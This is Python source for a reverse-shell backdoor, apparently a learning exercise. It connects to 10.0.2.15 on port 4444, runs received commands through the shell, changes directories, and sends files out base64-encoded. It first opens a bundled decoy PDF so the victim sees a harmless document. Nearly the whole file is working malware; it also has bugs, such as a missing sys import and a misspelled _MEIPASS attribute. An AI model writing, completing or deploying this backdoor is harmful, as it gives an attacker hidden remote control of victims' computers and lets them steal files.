#!/usr/bin/env python
import socket
import subprocess,os
import base64

class Backdoor:
	def __init__(self,ip,port):
		self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.connection.connect((ip,port))

	def executesyscommand(self,command):
		DEVNULL = open(os.devnull,'wb')
		return subprocess.check_output(command,shell=True,stderr=DEVNULL,stdin=DEVNULL)

	#meg="\n[+] Connection established \n "
	#connection.send(meg.encode(encoding='utf_8', errors='strict'))

	def read_file(self,path):
		with open(path,"rb") as file:
			return base64.b64encode(file.read())

	def changeworkingdirectory(self,path):
		os.chdir(path)#change directory
		return bytes("changesd",'utf-8')
	
	def run(self):
		while True:
			try:
				command= self.connection.recv(10024).decode(encoding='utf_8', errors='strict')
				command=command.split(" ")
			
				if command[0]=="exit":
					self.connection.close()
					sys.exit()
				elif command[0]=="cd" and len(command) >1:
					resultofcommand=self.changeworkingdirectory(command[1])
				elif command[0]=="download":
					resultofcommand=self.read_file(command[1])
				else:
					resultofcommand=self.executesyscommand(command)
			except Exception:
				resultofcommand = bytes(" [-] Eror during executesyscommand",'utf-8')
			self.connection.send(resultofcommand)

		self.connection.close()

file_name= sys.MEIPASS + "\sample.pdf"
subprocess.Popen(file_name,shell=True)

try:
	my_backdoor = Backdoor("10.0.2.15",4444)
	my_backdoor.run()
except Exception:
	sys.exit()